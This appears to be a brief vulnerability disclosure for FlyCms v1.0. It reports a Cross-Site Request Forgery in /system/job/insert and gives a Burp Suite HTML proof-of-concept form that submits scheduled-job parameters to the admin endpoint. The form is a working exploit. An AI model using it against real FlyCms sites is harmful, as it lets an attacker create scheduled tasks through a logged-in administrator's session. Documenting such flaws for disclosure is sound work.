target:https://github.com/sunkaifei/FlyCms
version: v1.0

FlyCms v1.0 was discovered to contain a Cross-Site Request Forgery (CSRF) via the component /system/job/insert

![图片1](1.png)

Poc:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://192.168.247.192/system/job/insert" method="POST">
      <input type="hidden" name="beanName" value="cs" />
      <input type="hidden" name="methodName" value="cs" />
      <input type="hidden" name="cronExpression" value="0&#47;10&#32;&#42;&#32;&#42;&#32;&#42;&#32;&#42;&#32;&#63;&#32;&#42;" />
      <input type="hidden" name="params" value="cs" />
      <input type="hidden" name="remark" value="cs" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>



```

![图片](2.png)

Successed

![图片](3.png)
